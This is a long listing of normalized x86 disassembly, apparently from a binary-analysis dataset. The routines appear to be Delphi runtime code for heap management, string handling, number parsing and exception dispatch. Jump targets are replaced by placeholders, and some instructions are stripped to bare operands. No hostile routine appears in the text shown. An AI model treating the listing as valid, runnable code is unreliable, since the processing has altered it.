pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
and ebx 0x7ffffffc
mov eax esi
add eax ebx
mov edi eax
cmp edi [ rw-data ]
jne r-xdata
mov eax esi
sub eax 0xc
mov edx [ eax + 0x8 ]
cmp edx 0xc
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
test dl 0x2
je r-xdata
sub [ rw-data ] ebx
add [ rw-data ] ebx
cmp [ rw-data ] 0x3c00
jle r-xdata
mov [ rw-data ] 0xa
jmp r-xdata
test edx 0x80000003
je r-xdata
retn
push rw-data
call sub_401370
mov eax edi
cmp [ eax + 0x4 ] 0x0
je r-xdata
and edx 0x7ffffffc
cmp edx 0x4
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_403ad8
jmp r-xdata
call sub_401ea0
mov eax esi
sub eax edx
cmp edx [ eax + 0x8 ]
je r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
or [ eax ] 0x1
jmp r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
add ebx edx
mov esi eax
call sub_401bb0
mov [ rw-data ] 0xa
jmp r-xdata
cmp [ eax + 0x8 ] 0xc
jge r-xdata
mov edx ebx
mov eax esi
call sub_401e18
mov edx [ eax + 0x8 ]
add ebx edx
call sub_401bb0
sub_40242c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
add esi 0x7
and esi 0xfffffffc
cmp esi 0xc
jge r-xdata
mov ebp eax
sub ebp 0x4
mov edi [ ebp ]
and edi 0x7ffffffc
mov eax ebp
add eax edi
mov ebx eax
cmp edi esi
jne r-xdata
mov esi 0xc
cmp edi esi
jle r-xdata
mov al 0x1
jmp r-xdata
mov eax esi
sub eax edi
mov [ esp + 0x4 ] eax
cmp ebx [ rw-data ]
jne r-xdata
mov edx edi
sub edx esi
mov [ esp ] edx
cmp ebx [ rw-data ]
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp eax [ esp + 0x4 ]
jl r-xdata
mov ebx eax
test [ ebx ] 0x2
jne r-xdata
mov eax [ esp ]
sub [ rw-data ] eax
mov eax [ esp ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
mov edx ebx
mov eax edx
mov ecx [ eax + 0x8 ]
mov [ esp ] ecx
mov ecx [ esp ]
cmp ecx [ esp + 0x4 ]
jge r-xdata
call sub_401ea0
mov ebx ebp
add ebx edi
mov eax [ esp + 0x4 ]
sub [ rw-data ] eax
mov eax [ esp + 0x4 ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
cmp [ esp ] 0xc
jl r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
add [ esp ] edx
call sub_401bb0
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
mov eax [ esp ]
add [ rw-data ] eax
mov eax [ esp ]
sub [ rw-data ] eax
mov esi edi
jmp r-xdata
xor eax eax
jmp r-xdata
and eax 0x7ffffffc
add eax ebx
mov ebx eax
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_401fa4
test al al
je r-xdata
call sub_401bb0
mov eax [ esp + 0x4 ]
sub [ esp ] eax
cmp [ esp ] 0xc
jl r-xdata
add edx [ esp ]
mov ebx edx
mov eax [ esp ]
sub [ esp + 0x4 ] eax
jmp r-xdata
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
jmp r-xdata
mov eax [ rw-data ]
add [ rw-data ] eax
add esi [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edi
jmp r-xdata
mov ebx ebp
add ebx esi
mov eax [ esp ]
or eax 0x2
mov [ ebx ] eax
mov eax ebx
add eax 0x4
call sub_401c74
jmp r-xdata
mov ebx ebp
add ebx edi
jmp r-xdata
add esi [ esp ]
mov ebx ebp
add ebx esi
and [ ebx ] 0xfffffffe
jmp r-xdata
mov eax ebp
add eax esi
mov edx [ esp ]
call sub_401e18
jmp r-xdata
sub_402608
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4026b9
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a0c
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_40242c
test al al
je r-xdata
push rw-data
call sub_401368
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax esi
call sub_4020f8
mov edi eax
mov eax ebx
sub eax 0x4
mov eax [ eax ]
and eax 0x7ffffffc
sub eax 0x4
cmp esi eax
jge r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test edi edi
je r-xdata
mov eax esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] edi
mov edx edi
mov ecx ebx
xchg ecx eax
call sub_4028c8
mov eax ebx
call sub_402288
retn
push rw-data
call sub_401370
sub_4026cc
push ebx
test eax eax
jle r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
mov al 0x1
call sub_402828
sub_4026ec
push ebx
test eax eax
je r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov al 0x2
call sub_402828
sub_40270c
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_402828
mov [ ecx ] eax
mov al 0x2
jmp sub_402828
retn
mov [ ecx ] eax
retn
sub_40279c
push ebx
push esi
call sub_405e10
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_405e10
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_405e10
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_4027dc
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_405e10
mov ebx [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov al bl
mov edx esi
call sub_4027d0
xor eax eax
mov al bl
mov bl [ eax + rw-data ]
sub_402864
push esi
push edi
mov esi eax
mov edi [ esp + 0xc ]
xor eax eax
or al [ esi ]
je r-xdata
mov [ edi ] al
test edx edx
jle r-xdata
mov edx 0x1
jmp r-xdata
cmp edx eax
jg r-xdata
sub eax edx
inc eax
test ecx ecx
jl r-xdata
xor ecx ecx
jmp r-xdata
cmp ecx eax
jg r-xdata
add esi edx
mov [ edi ] cl
inc edi
[ edi ] [ esi ]
jmp r-xdata
mov ecx eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_4028c8
push esi
push edi
mov esi eax
mov edi edx
mov eax ecx
cmp edi esi
ja r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
sar ecx 0x2
js r-xdata
je r-xdata
pop edi
pop esi
retn
std
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
add esi 0x3
add edi 0x3
[ edi ] [ esi ]
cld
sar ecx 0x2
js r-xdata
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_402908
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x22
jne r-xdata
cmp al 0x20
jbe r-xdata
xor ebp ebp
mov edi ebx
jmp r-xdata
cmp [ ebx + 0x1 ] 0x22
jne r-xdata
push ebx
call sub_40121c
mov ebx eax
mov al [ ebx ]
cmp al 0x20
ja r-xdata
add ebx 0x2
jmp r-xdata
cmp al 0x22
jne r-xdata
mov eax esi
mov edx ebp
call sub_4046c0
mov ebx edi
mov edi [ esi ]
xor esi esi
jmp r-xdata
push ebx
call sub_40121c
mov edx eax
sub edx ebx
add ebp edx
mov ebx eax
push ebx
call sub_40121c
mov ebx eax
jmp r-xdata
mov al [ ebx ]
cmp al 0x20
ja r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp al 0x22
jne r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
push ebx
call sub_40121c
cmp eax ebx
jbe r-xdata
push ebx
call sub_40121c
mov ebx eax
jmp r-xdata
push ebx
call sub_40121c
mov ebx eax
jmp r-xdata
push ebx
call sub_40121c
mov edx eax
sub edx ebx
add ebp edx
mov ebx eax
mov dl [ ebx ]
mov [ edi + esi ] dl
inc ebx
inc esi
cmp eax ebx
ja r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
push ebx
call sub_40121c
mov ebx eax
jmp r-xdata
push ebx
call sub_40121c
cmp eax ebx
jbe r-xdata
mov dl [ ebx ]
mov [ edi + esi ] dl
inc ebx
inc esi
cmp eax ebx
ja r-xdata
sub_4029f4
push ebx
push esi
push edi
add esp 0xfffffef8
mov ebx edx
mov esi eax
mov eax ebx
call sub_404074
test esi esi
jne r-xdata
call GetCommandLineA
mov edi eax
push 0x105
lea eax [ esp + 0x4 ]
push eax
push 0x0
call sub_40126c
mov ecx eax
mov edx esp
mov eax ebx
call sub_404164
jmp r-xdata
add esp 0x108
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
dec esi
jmp r-xdata
mov edx ebx
mov eax edi
call sub_402908
mov edi eax
test esi esi
je r-xdata
sub_402a84
sub esp 0xc
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
fistp [ esp + 0x4 ]
fwait
fldcw [ esp ]
pop ecx
pop eax
pop edx
retn
sub_402ac4
push ebx
mov cx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_402854
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_402b18
push ebx
push esi
mov ebx eax
xor esi esi
mov ax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_402854
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_402854
jmp r-xdata
sub_402b70
push esi
push edi
mov edi eax
xor eax eax
mov al [ edi ]
mov esi edx
xor edx edx
mov dl [ esi ]
inc esi
add al dl
jb r-xdata
mov al cl
sub cl [ edi ]
jbe r-xdata
cmp al cl
ja r-xdata
pop edi
pop esi
retn
mov dl cl
jmp r-xdata
mov ecx edx
mov dl [ edi ]
mov [ edi ] al
inc edi
add edi edx
[ edi ] [ esi ]
sub_402bac
push ebx
mov bl [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
and ecx 0xff
xchg edx eax
call sub_4028c8
pop ebx
retn
mov ecx ebx
sub_402bc8
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_402c4c
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_402cbc
push edi
mov edi eax
mov ch cl
mov eax ecx
shl eax 0x10
mov ax cx
mov ecx edx
sar ecx 0x2
js r-xdata
pop edi
retn
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_402cdc
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_402dbc
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_402dfc
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402eaf ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402eaf ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_402eaf
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_4030e8
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_403118
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_4012c4
test eax eax
jne r-xdata
mov ax [ rw-data ]
and ax 0xffc0
mov dx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_403189
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012bc
retn
sub_403204
push ebx
xor ebx ebx
or edx edx
je r-xdata
mov al bl
pop ebx
retn
mov eax [ eax - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
dec edx
dec ecx
jne r-xdata
mov bh [ ecx + eax ]
xor bh [ ecx + edx ]
and bh 0xdf
jne r-xdata
inc ebx
sub_4032ac
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_403304
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_404ab0
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_403324
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_4056f8
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_403354
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4033d8
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_4033e8
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4033df
lea eax [ ebp - 0x8 ]
call sub_4056e0
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_403324
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4056f8
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_4033e8
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_40342c
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_4034cc
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_40346c
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_40349c
push eax
push ecx
mov eax [ eax ]
call sub_40346c
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403fe4
call [ rw-data ]
sub_4034b4
push esi
mov esi edx
mov eax [ eax ]
call sub_40346c
mov eax esi
pop esi
jne r-xdata
retn
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403fe4
call [ rw-data ]
sub_4034fc
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_40346c
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_403524
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_403574
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_4035c4
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_4035ed
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_403658
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_403694
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_4036a8
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_4036bc
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_4036dc
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_4036bc
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_403740
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_4031dc
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_405e10
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_4036a8
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_403658
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_40386c
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_4031dc
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_403658
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
